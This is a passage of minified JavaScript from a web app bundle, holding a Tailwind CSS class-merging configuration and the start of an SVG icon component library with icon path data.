f.length>0&&(f.sort(),m.push(...f)),m}},J0=i=>({cache:Q0(i.cacheSize),parseClassName:K0(i),sortModifiers:W0(i),...P0(i)}),$0=/\s+/,eb=(i,l)=>{const{parseClassName:u,getClassGroupId:m,getConflictingClassGroupIds:f,sortModifiers:j}=l,A=[],R=i.trim().split($0);let O="";for(let w=R.length-1;w>=0;w-=1){const D=R[w],{isExternal:k,modifiers:U,hasImportantModifier:$,baseClassName:Y,maybePostfixModifierPosition:G}=u(D);if(k){O=D+(O.length>0?" "+O:O);continue}let K=!!G,oe=m(K?Y.substring(0,G):Y);if(!oe){if(!K){O=D+(O.length>0?" "+O:O);continue}if(oe=m(Y),!oe){O=D+(O.length>0?" "+O:O);continue}K=!1}const Pe=U.length===0?"":U.length===1?U[0]:j(U).join(":"),ye=$?Pe+Fl:Pe,Te=ye+oe;if(A.indexOf(Te)>-1)continue;A.push(Te);const ze=f(oe,K);for(let Me=0;Me<ze.length;++Me){const Je=ze[Me];A.push(ye+Je)}O=D+(O.length>0?" "+O:O)}return O},ab=(...i)=>{let l=0,u,m,f="";for(;l<i.length;)(u=i[l++])&&(m=kx(u))&&(f&&(f+=" "),f+=m);return f},kx=i=>{if(typeof i=="string")return i;let l,u="";for(let m=0;m<i.length;m++)i[m]&&(l=kx(i[m]))&&(u&&(u+=" "),u+=l);return u},rb=(i,...l)=>{let u,m,f,j;const A=O=>{const w=l.reduce((D,k)=>k(D),i());return u=J0(w),m=u.cache.get,f=u.cache.set,j=R,R(O)},R=O=>{const w=m(O);if(w)return w;const D=eb(O,u);return f(O,D),D};return j=A,(...O)=>j(ab(...O))},tb=[],Be=i=>{const l=u=>u[i]||tb;return l.isThemeGetter=!0,l},Fx=/^\[(?:(\w[\w-]*):)?(.+)\]$/i,Gx=/^\((?:(\w[\w-]*):)?(.+)\)$/i,sb=/^\d+(?:\.\d+)?\/\d+(?:\.\d+)?$/,ob=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,ib=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,nb=/^(rgba?|hsla?|hwb|(ok)?(lab|lch)|color-mix)\(.+\)$/,lb=/^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/,cb=/^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/,Mr=i=>sb.test(i),J=i=>!!i&&!Number.isNaN(Number(i)),Or=i=>!!i&&Number.isInteger(Number(i)),Bl=i=>i.endsWith("%")&&J(i.slice(0,-1)),er=i=>ob.test(i),Vx=()=>!0,db=i=>ib.test(i)&&!nb.test(i),Wl=()=>!1,mb=i=>lb.test(i),ub=i=>cb.test(i),xb=i=>!B(i)&&!P(i),pb=i=>Dr(i,Qx,Wl),B=i=>Fx.test(i),$r=i=>Dr(i,Yx,db),fx=i=>Dr(i,Sb,J),hb=i=>Dr(i,Wx,Vx),fb=i=>Dr(i,Kx,Wl),bx=i=>Dr(i,Hx,Wl),bb=i=>Dr(i,Zx,ub),li=i=>Dr(i,Jx,mb),P=i=>Gx.test(i),Us=i=>at(i,Yx),gb=i=>at(i,Kx),gx=i=>at(i,Hx),vb=i=>at(i,Qx),jb=i=>at(i,Zx),ci=i=>at(i,Jx,!0),yb=i=>at(i,Wx,!0),Dr=(i,l,u)=>{const m=Fx.exec(i);return m?m[1]?l(m[1]):u(m[2]):!1},at=(i,l,u=!1)=>{const m=Gx.exec(i);return m?m[1]?l(m[1]):u:!1},Hx=i=>i==="position"||i==="percentage",Zx=i=>i==="image"||i==="url",Qx=i=>i==="length"||i==="size"||i==="bg-size",Yx=i=>i==="length",Sb=i=>i==="number",Kx=i=>i==="family-name",Wx=i=>i==="number"||i==="weight",Jx=i=>i==="shadow",Ab=()=>{const i=Be("color"),l=Be("font"),u=Be("text"),m=Be("font-weight"),f=Be("tracking"),j=Be("leading"),A=Be("breakpoint"),R=Be("container"),O=Be("spacing"),w=Be("radius"),D=Be("shadow"),k=Be("inset-shadow"),U=Be("text-shadow"),$=Be("drop-shadow"),Y=Be("blur"),G=Be("perspective"),K=Be("aspect"),oe=Be("ease"),Pe=Be("animate"),ye=()=>["auto","avoid","all","avoid-page","page","left","right","column"],Te=()=>["center","top","bottom","left","right","top-left","left-top","top-right","right-top","bottom-right","right-bottom","bottom-left","left-bottom"],ze=()=>[...Te(),P,B],Me=()=>["auto","hidden","clip","visible","scroll"],Je=()=>["auto","contain","none"],I=()=>[P,B,O],qe=()=>[Mr,"full","auto",...I()],Tr=()=>[Or,"none","subgrid",P,B],za=()=>["auto",{span:["full",Or,P,B]},Or,P,B],Ve=()=>[Or,"auto",P,B],qr=()=>["auto","min","max","fr",P,B],wa=()=>["start","end","center","between","around","evenly","stretch","baseline","center-safe","end-safe"],Ye=()=>["start","end","center","stretch","center-safe","end-safe"],E=()=>["auto",...I()],N=()=>[Mr,"auto","full","dvw","dvh","lvw","lvh","svw","svh","min","max","fit",...I()],H=()=>[Mr,"screen","full","dvw","lvw","svw","min","max","fit",...I()],ce=()=>[Mr,"screen","full","lh","dvh","lvh","svh","min","max","fit",...I()],z=()=>[i,P,B],Ue=()=>[...Te(),gx,bx,{position:[P,B]}],be=()=>["no-repeat",{repeat:["","x","y","space","round"]}],ne=()=>["auto","cover","contain",vb,pb,{size:[P,B]}],Ee=()=>[Bl,Us,$r],ge=()=>["","none","full",w,P,B],Se=()=>["",J,Us,$r],Xa=()=>["solid","dashed","dotted","double"],Nr=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],je=()=>[J,Bl,gx,bx],rt=()=>["","none",Y,P,B],Ba=()=>["none",J,P,B],rr=()=>["none",J,P,B],Lr=()=>[J,P,B],tr=()=>[Mr,"full",...I()];return{cacheSize:500,theme:{animate:["spin","ping","pulse","bounce"],aspect:["video"],blur:[er],breakpoint:[er],color:[Vx],container:[er],"drop-shadow":[er],ease:["in","out","in-out"],font:[xb],"font-weight":["thin","extralight","light","normal","medium","semibold","bold","extrabold","black"],"inset-shadow":[er],leading:["none","tight","snug","normal","relaxed","loose"],perspective:["dramatic","near","normal","midrange","distant","none"],radius:[er],shadow:[er],spacing:["px",J],text:[er],"text-shadow":[er],tracking:["tighter","tight","normal","wide","wider","widest"]},classGroups:{aspect:[{aspect:["auto","square",Mr,B,P,K]}],container:["container"],columns:[{columns:[J,B,P,R]}],"break-after":[{"break-after":ye()}],"break-before":[{"break-before":ye()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],sr:["sr-only","not-sr-only"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:ze()}],overflow:[{overflow:Me()}],"overflow-x":[{"overflow-x":Me()}],"overflow-y":[{"overflow-y":Me()}],overscroll:[{overscroll:Je()}],"overscroll-x":[{"overscroll-x":Je()}],"overscroll-y":[{"overscroll-y":Je()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:qe()}],"inset-x":[{"inset-x":qe()}],"inset-y":[{"inset-y":qe()}],start:[{"inset-s":qe(),start:qe()}],end:[{"inset-e":qe(),end:qe()}],"inset-bs":[{"inset-bs":qe()}],"inset-be":[{"inset-be":qe()}],top:[{top:qe()}],right:[{right:qe()}],bottom:[{bottom:qe()}],left:[{left:qe()}],visibility:["visible","invisible","collapse"],z:[{z:[Or,"auto",P,B]}],basis:[{basis:[Mr,"full","auto",R,...I()]}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["nowrap","wrap","wrap-reverse"]}],flex:[{flex:[J,Mr,"auto","initial","none",B]}],grow:[{grow:["",J,P,B]}],shrink:[{shrink:["",J,P,B]}],order:[{order:[Or,"first","last","none",P,B]}],"grid-cols":[{"grid-cols":Tr()}],"col-start-end":[{col:za()}],"col-start":[{"col-start":Ve()}],"col-end":[{"col-end":Ve()}],"grid-rows":[{"grid-rows":Tr()}],"row-start-end":[{row:za()}],"row-start":[{"row-start":Ve()}],"row-end":[{"row-end":Ve()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":qr()}],"auto-rows":[{"auto-rows":qr()}],gap:[{gap:I()}],"gap-x":[{"gap-x":I()}],"gap-y":[{"gap-y":I()}],"justify-content":[{justify:[...wa(),"normal"]}],"justify-items":[{"justify-items":[...Ye(),"normal"]}],"justify-self":[{"justify-self":["auto",...Ye()]}],"align-content":[{content:["normal",...wa()]}],"align-items":[{items:[...Ye(),{baseline:["","last"]}]}],"align-self":[{self:["auto",...Ye(),{baseline:["","last"]}]}],"place-content":[{"place-content":wa()}],"place-items":[{"place-items":[...Ye(),"baseline"]}],"place-self":[{"place-self":["auto",...Ye()]}],p:[{p:I()}],px:[{px:I()}],py:[{py:I()}],ps:[{ps:I()}],pe:[{pe:I()}],pbs:[{pbs:I()}],pbe:[{pbe:I()}],pt:[{pt:I()}],pr:[{pr:I()}],pb:[{pb:I()}],pl:[{pl:I()}],m:[{m:E()}],mx:[{mx:E()}],my:[{my:E()}],ms:[{ms:E()}],me:[{me:E()}],mbs:[{mbs:E()}],mbe:[{mbe:E()}],mt:[{mt:E()}],mr:[{mr:E()}],mb:[{mb:E()}],ml:[{ml:E()}],"space-x":[{"space-x":I()}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":I()}],"space-y-reverse":["space-y-reverse"],size:[{size:N()}],"inline-size":[{inline:["auto",...H()]}],"min-inline-size":[{"min-inline":["auto",...H()]}],"max-inline-size":[{"max-inline":["none",...H()]}],"block-size":[{block:["auto",...ce()]}],"min-block-size":[{"min-block":["auto",...ce()]}],"max-block-size":[{"max-block":["none",...ce()]}],w:[{w:[R,"screen",...N()]}],"min-w":[{"min-w":[R,"screen","none",...N()]}],"max-w":[{"max-w":[R,"screen","none","prose",{screen:[A]},...N()]}],h:[{h:["screen","lh",...N()]}],"min-h":[{"min-h":["screen","lh","none",...N()]}],"max-h":[{"max-h":["screen","lh",...N()]}],"font-size":[{text:["base",u,Us,$r]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:[m,yb,hb]}],"font-stretch":[{"font-stretch":["ultra-condensed","extra-condensed","condensed","semi-condensed","normal","semi-expanded","expanded","extra-expanded","ultra-expanded",Bl,B]}],"font-family":[{font:[gb,fb,l]}],"font-features":[{"font-features":[B]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractions"],tracking:[{tracking:[f,P,B]}],"line-clamp":[{"line-clamp":[J,"none",P,fx]}],leading:[{leading:[j,...I()]}],"list-image":[{"list-image":["none",P,B]}],"list-style-position":[{list:["inside","outside"]}],"list-style-type":[{list:["disc","decimal","none",P,B]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"placeholder-color":[{placeholder:z()}],"text-color":[{text:z()}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...Xa(),"wavy"]}],"text-decoration-thickness":[{decoration:[J,"from-font","auto",P,$r]}],"text-decoration-color":[{decoration:z()}],"underline-offset":[{"underline-offset":[J,"auto",P,B]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:I()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",P,B]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],wrap:[{wrap:["break-word","anywhere","normal"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",P,B]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:Ue()}],"bg-repeat":[{bg:be()}],"bg-size":[{bg:ne()}],"bg-image":[{bg:["none",{linear:[{to:["t","tr","r","br","b","bl","l","tl"]},Or,P,B],radial:["",P,B],conic:[Or,P,B]},jb,bb]}],"bg-color":[{bg:z()}],"gradient-from-pos":[{from:Ee()}],"gradient-via-pos":[{via:Ee()}],"gradient-to-pos":[{to:Ee()}],"gradient-from":[{from:z()}],"gradient-via":[{via:z()}],"gradient-to":[{to:z()}],rounded:[{rounded:ge()}],"rounded-s":[{"rounded-s":ge()}],"rounded-e":[{"rounded-e":ge()}],"rounded-t":[{"rounded-t":ge()}],"rounded-r":[{"rounded-r":ge()}],"rounded-b":[{"rounded-b":ge()}],"rounded-l":[{"rounded-l":ge()}],"rounded-ss":[{"rounded-ss":ge()}],"rounded-se":[{"rounded-se":ge()}],"rounded-ee":[{"rounded-ee":ge()}],"rounded-es":[{"rounded-es":ge()}],"rounded-tl":[{"rounded-tl":ge()}],"rounded-tr":[{"rounded-tr":ge()}],"rounded-br":[{"rounded-br":ge()}],"rounded-bl":[{"rounded-bl":ge()}],"border-w":[{border:Se()}],"border-w-x":[{"border-x":Se()}],"border-w-y":[{"border-y":Se()}],"border-w-s":[{"border-s":Se()}],"border-w-e":[{"border-e":Se()}],"border-w-bs":[{"border-bs":Se()}],"border-w-be":[{"border-be":Se()}],"border-w-t":[{"border-t":Se()}],"border-w-r":[{"border-r":Se()}],"border-w-b":[{"border-b":Se()}],"border-w-l":[{"border-l":Se()}],"divide-x":[{"divide-x":Se()}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":Se()}],"divide-y-reverse":["divide-y-reverse"],"border-style":[{border:[...Xa(),"hidden","none"]}],"divide-style":[{divide:[...Xa(),"hidden","none"]}],"border-color":[{border:z()}],"border-color-x":[{"border-x":z()}],"border-color-y":[{"border-y":z()}],"border-color-s":[{"border-s":z()}],"border-color-e":[{"border-e":z()}],"border-color-bs":[{"border-bs":z()}],"border-color-be":[{"border-be":z()}],"border-color-t":[{"border-t":z()}],"border-color-r":[{"border-r":z()}],"border-color-b":[{"border-b":z()}],"border-color-l":[{"border-l":z()}],"divide-color":[{divide:z()}],"outline-style":[{outline:[...Xa(),"none","hidden"]}],"outline-offset":[{"outline-offset":[J,P,B]}],"outline-w":[{outline:["",J,Us,$r]}],"outline-color":[{outline:z()}],shadow:[{shadow:["","none",D,ci,li]}],"shadow-color":[{shadow:z()}],"inset-shadow":[{"inset-shadow":["none",k,ci,li]}],"inset-shadow-color":[{"inset-shadow":z()}],"ring-w":[{ring:Se()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:z()}],"ring-offset-w":[{"ring-offset":[J,$r]}],"ring-offset-color":[{"ring-offset":z()}],"inset-ring-w":[{"inset-ring":Se()}],"inset-ring-color":[{"inset-ring":z()}],"text-shadow":[{"text-shadow":["none",U,ci,li]}],"text-shadow-color":[{"text-shadow":z()}],opacity:[{opacity:[J,P,B]}],"mix-blend":[{"mix-blend":[...Nr(),"plus-darker","plus-lighter"]}],"bg-blend":[{"bg-blend":Nr()}],"mask-clip":[{"mask-clip":["border","padding","content","fill","stroke","view"]},"mask-no-clip"],"mask-composite":[{mask:["add","subtract","intersect","exclude"]}],"mask-image-linear-pos":[{"mask-linear":[J]}],"mask-image-linear-from-pos":[{"mask-linear-from":je()}],"mask-image-linear-to-pos":[{"mask-linear-to":je()}],"mask-image-linear-from-color":[{"mask-linear-from":z()}],"mask-image-linear-to-color":[{"mask-linear-to":z()}],"mask-image-t-from-pos":[{"mask-t-from":je()}],"mask-image-t-to-pos":[{"mask-t-to":je()}],"mask-image-t-from-color":[{"mask-t-from":z()}],"mask-image-t-to-color":[{"mask-t-to":z()}],"mask-image-r-from-pos":[{"mask-r-from":je()}],"mask-image-r-to-pos":[{"mask-r-to":je()}],"mask-image-r-from-color":[{"mask-r-from":z()}],"mask-image-r-to-color":[{"mask-r-to":z()}],"mask-image-b-from-pos":[{"mask-b-from":je()}],"mask-image-b-to-pos":[{"mask-b-to":je()}],"mask-image-b-from-color":[{"mask-b-from":z()}],"mask-image-b-to-color":[{"mask-b-to":z()}],"mask-image-l-from-pos":[{"mask-l-from":je()}],"mask-image-l-to-pos":[{"mask-l-to":je()}],"mask-image-l-from-color":[{"mask-l-from":z()}],"mask-image-l-to-color":[{"mask-l-to":z()}],"mask-image-x-from-pos":[{"mask-x-from":je()}],"mask-image-x-to-pos":[{"mask-x-to":je()}],"mask-image-x-from-color":[{"mask-x-from":z()}],"mask-image-x-to-color":[{"mask-x-to":z()}],"mask-image-y-from-pos":[{"mask-y-from":je()}],"mask-image-y-to-pos":[{"mask-y-to":je()}],"mask-image-y-from-color":[{"mask-y-from":z()}],"mask-image-y-to-color":[{"mask-y-to":z()}],"mask-image-radial":[{"mask-radial":[P,B]}],"mask-image-radial-from-pos":[{"mask-radial-from":je()}],"mask-image-radial-to-pos":[{"mask-radial-to":je()}],"mask-image-radial-from-color":[{"mask-radial-from":z()}],"mask-image-radial-to-color":[{"mask-radial-to":z()}],"mask-image-radial-shape":[{"mask-radial":["circle","ellipse"]}],"mask-image-radial-size":[{"mask-radial":[{closest:["side","corner"],farthest:["side","corner"]}]}],"mask-image-radial-pos":[{"mask-radial-at":Te()}],"mask-image-conic-pos":[{"mask-conic":[J]}],"mask-image-conic-from-pos":[{"mask-conic-from":je()}],"mask-image-conic-to-pos":[{"mask-conic-to":je()}],"mask-image-conic-from-color":[{"mask-conic-from":z()}],"mask-image-conic-to-color":[{"mask-conic-to":z()}],"mask-mode":[{mask:["alpha","luminance","match"]}],"mask-origin":[{"mask-origin":["border","padding","content","fill","stroke","view"]}],"mask-position":[{mask:Ue()}],"mask-repeat":[{mask:be()}],"mask-size":[{mask:ne()}],"mask-type":[{"mask-type":["alpha","luminance"]}],"mask-image":[{mask:["none",P,B]}],filter:[{filter:["","none",P,B]}],blur:[{blur:rt()}],brightness:[{brightness:[J,P,B]}],contrast:[{contrast:[J,P,B]}],"drop-shadow":[{"drop-shadow":["","none",$,ci,li]}],"drop-shadow-color":[{"drop-shadow":z()}],grayscale:[{grayscale:["",J,P,B]}],"hue-rotate":[{"hue-rotate":[J,P,B]}],invert:[{invert:["",J,P,B]}],saturate:[{saturate:[J,P,B]}],sepia:[{sepia:["",J,P,B]}],"backdrop-filter":[{"backdrop-filter":["","none",P,B]}],"backdrop-blur":[{"backdrop-blur":rt()}],"backdrop-brightness":[{"backdrop-brightness":[J,P,B]}],"backdrop-contrast":[{"backdrop-contrast":[J,P,B]}],"backdrop-grayscale":[{"backdrop-grayscale":["",J,P,B]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[J,P,B]}],"backdrop-invert":[{"backdrop-invert":["",J,P,B]}],"backdrop-opacity":[{"backdrop-opacity":[J,P,B]}],"backdrop-saturate":[{"backdrop-saturate":[J,P,B]}],"backdrop-sepia":[{"backdrop-sepia":["",J,P,B]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":I()}],"border-spacing-x":[{"border-spacing-x":I()}],"border-spacing-y":[{"border-spacing-y":I()}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["","all","colors","opacity","shadow","transform","none",P,B]}],"transition-behavior":[{transition:["normal","discrete"]}],duration:[{duration:[J,"initial",P,B]}],ease:[{ease:["linear","initial",oe,P,B]}],delay:[{delay:[J,P,B]}],animate:[{animate:["none",Pe,P,B]}],backface:[{backface:["hidden","visible"]}],perspective:[{perspective:[G,P,B]}],"perspective-origin":[{"perspective-origin":ze()}],rotate:[{rotate:Ba()}],"rotate-x":[{"rotate-x":Ba()}],"rotate-y":[{"rotate-y":Ba()}],"rotate-z":[{"rotate-z":Ba()}],scale:[{scale:rr()}],"scale-x":[{"scale-x":rr()}],"scale-y":[{"scale-y":rr()}],"scale-z":[{"scale-z":rr()}],"scale-3d":["scale-3d"],skew:[{skew:Lr()}],"skew-x":[{"skew-x":Lr()}],"skew-y":[{"skew-y":Lr()}],transform:[{transform:[P,B,"","none","gpu","cpu"]}],"transform-origin":[{origin:ze()}],"transform-style":[{transform:["3d","flat"]}],translate:[{translate:tr()}],"translate-x":[{"translate-x":tr()}],"translate-y":[{"translate-y":tr()}],"translate-z":[{"translate-z":tr()}],"translate-none":["translate-none"],accent:[{accent:z()}],appearance:[{appearance:["none","auto"]}],"caret-color":[{caret:z()}],"color-scheme":[{scheme:["normal","dark","light","light-dark","only-dark","only-light"]}],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",P,B]}],"field-sizing":[{"field-sizing":["fixed","content"]}],"pointer-events":[{"pointer-events":["auto","none"]}],resize:[{resize:["none","","y","x"]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":I()}],"scroll-mx":[{"scroll-mx":I()}],"scroll-my":[{"scroll-my":I()}],"scroll-ms":[{"scroll-ms":I()}],"scroll-me":[{"scroll-me":I()}],"scroll-mbs":[{"scroll-mbs":I()}],"scroll-mbe":[{"scroll-mbe":I()}],"scroll-mt":[{"scroll-mt":I()}],"scroll-mr":[{"scroll-mr":I()}],"scroll-mb":[{"scroll-mb":I()}],"scroll-ml":[{"scroll-ml":I()}],"scroll-p":[{"scroll-p":I()}],"scroll-px":[{"scroll-px":I()}],"scroll-py":[{"scroll-py":I()}],"scroll-ps":[{"scroll-ps":I()}],"scroll-pe":[{"scroll-pe":I()}],"scroll-pbs":[{"scroll-pbs":I()}],"scroll-pbe":[{"scroll-pbe":I()}],"scroll-pt":[{"scroll-pt":I()}],"scroll-pr":[{"scroll-pr":I()}],"scroll-pb":[{"scroll-pb":I()}],"scroll-pl":[{"scroll-pl":I()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","manipulation"]}],"touch-x":[{"touch-pan":["x","left","right"]}],"touch-y":[{"touch-pan":["y","up","down"]}],"touch-pz":["touch-pinch-zoom"],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",P,B]}],fill:[{fill:["none",...z()]}],"stroke-w":[{stroke:[J,Us,$r,fx]}],stroke:[{stroke:["none",...z()]}],"forced-color-adjust":[{"forced-color-adjust":["auto","none"]}]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","inset-bs","inset-be","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pbs","pbe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mbs","mbe","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],size:["w","h"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],"line-clamp":["display","overflow"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-x","border-w-y","border-w-s","border-w-e","border-w-bs","border-w-be","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-x","border-color-y","border-color-s","border-color-e","border-color-bs","border-color-be","border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],translate:["translate-x","translate-y","translate-none"],"translate-none":["translate","translate-x","translate-y","translate-z"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mbs","scroll-mbe","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pbs","scroll-pbe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"],touch:["touch-x","touch-y","touch-pz"],"touch-x":["touch"],"touch-y":["touch"],"touch-pz":["touch"]},conflictingClassGroupModifiers:{"font-size":["leading"]},orderSensitiveModifiers:["*","**","after","backdrop","before","details-content","file","first-letter","first-line","marker","placeholder","selection"]}},Rb=rb(Ab);function et(...i){return Rb(z0(i))}const Eb=i=>i.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),Cb=i=>i.replace(/^([A-Z])|[\s-_]+(\w)/g,(l,u,m)=>m?m.toUpperCase():u.toLowerCase()),vx=i=>{const l=Cb(i);return l.charAt(0).toUpperCase()+l.slice(1)},$x=(...i)=>i.filter((l,u,m)=>!!l&&l.trim()!==""&&m.indexOf(l)===u).join(" ").trim(),_b=i=>{for(const l in i)if(l.startsWith("aria-")||l==="role"||l==="title")return!0};var Mb={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const Ob=se.forwardRef(({color:i="currentColor",size:l=24,strokeWidth:u=2,absoluteStrokeWidth:m,className:f="",children:j,iconNode:A,...R},O)=>se.createElement("svg",{ref:O,...Mb,width:l,height:l,stroke:i,strokeWidth:m?Number(u)*24/Number(l):u,className:$x("lucide",f),...!j&&!_b(R)&&{"aria-hidden":"true"},...R},[...A.map(([w,D])=>se.createElement(w,D)),...Array.isArray(j)?j:[j]]));const fe=(i,l)=>{const u=se.forwardRef(({className:m,...f},j)=>se.createElement(Ob,{ref:j,iconNode:l,className:$x(`lucide-${Eb(vx(i))}`,`lucide-${i}`,m),...f}));return u.displayName=vx(i),u};const Db=[["rect",{x:"14",y:"14",width:"4",height:"6",rx:"2",key:"p02svl"}],["rect",{x:"6",y:"4",width:"4",height:"6",rx:"2",key:"xm4xkj"}],["path",{d:"M6 20h4",key:"1i6q5t"}],["path",{d:"M14 10h4",key:"ru81e7"}],["path",{d:"M6 14h2v6",key:"16z9wg"}],["path",{d:"M14 4h2v6",key:"1idq9u"}]],Jl=fe("binary",Db);const Tb=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],xi=fe("book-open",Tb);const qb=[["path",{d:"M20 6 9 17l-5-5",key:"1gmf2c"}]],Nb=fe("check",qb);const Lb=[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]],zb=fe("chevron-down",Lb);const wb=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],Gl=fe("chevron-right",wb);const Xb=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["line",{x1:"12",x2:"12",y1:"8",y2:"12",key:"1pkeuh"}],["line",{x1:"12",x2:"12.01",y1:"16",y2:"16",key:"4dfq90"}]],Bb=fe("circle-alert",Xb);const Pb=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],Ub=fe("circle-check",Pb);const Ib=[["path",{d:"M12 6v6l4 2",key:"mmk7yg"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}]],kb=fe("clock",Ib);const Fb=[["path",{d:"m18 16 4-4-4-4",key:"1inbqp"}],["path",{d:"m6 8-4 4 4 4",key:"15zrgr"}],["path",{d:"m14.5 4-5 16",key:"e7oirm"}]],pi=fe("code-xml",Fb);const Gb=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],Vb=fe("copy",Gb);const Hb=[["path",{d:"M12 20v2",key:"1lh1kg"}],["path",{d:"M12 2v2",key:"tus03m"}],["path",{d:"M17 